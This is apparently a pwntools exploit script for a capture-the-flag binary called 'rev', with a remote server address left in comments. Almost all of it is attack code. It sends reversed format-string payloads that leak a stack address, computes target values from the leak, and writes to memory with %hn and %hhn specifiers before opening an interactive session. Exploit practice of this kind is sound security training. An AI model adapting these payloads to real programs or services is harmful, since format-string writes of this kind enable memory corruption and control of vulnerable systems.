#!/usr/bin/python3

from pwn import *
context.binary = exe = ELF('./rev',checksec=False)
p = process()
#p = remote('23.146.248.230', 12321)
#gdb.attach(p,gdbscript='''
#           brva 0x00000000000012ED
#           ''')
#p = remote('23.146.248.230', 12321)
#while True:
    #p = process('./rev')
    #try:
input()
p.sendlineafter(b'String: ',b'p$8%')
leak = int(p.recvline()[10:-1],16) - 0xa4
print(hex(leak))
leak_1 = str(leak)
leak_1 = leak_1.encode()
print(leak)
leak_2 = leak+2
print(hex(leak_2))
leak_2 = str(leak_2 & 0xff)
leak_2 = leak_2.encode()
print(leak_2)
#p.sendlineafter(b'String: ',b'')
leak_1 = leak_1[::-1]
print(leak_1)
leak_2 = leak_2[::-1]
print(leak_2)
offset = 28
payload = b'%8$hn'
p.sendlineafter(b'String: ',b'nh$8%' + b'c' + leak_1 + b'%')
p.sendlineafter(b'String: ',b'nh$82%c97884%')
p.sendlineafter(b'String: ',b'nhh$8%' + b'c' + leak_2 + b'%')
p.sendlineafter(b'String: ',b'nh$82%c50075%')




p.interactive()
